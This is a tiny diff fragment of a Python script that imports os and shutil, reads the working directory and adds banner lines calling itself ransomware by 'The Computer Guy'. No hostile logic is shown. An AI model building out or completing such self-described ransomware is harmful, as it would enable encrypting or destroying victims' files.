@@ -2,6 +2,9 @@
 import os
 import shutil
 
+print("Ransome Ware built by The Computer Guy")
+print("Copyright 2020 The Computer Guy. All Rights Reserved.")
+
 # getting the current working directory
 src_dir = os.getcwd()
 
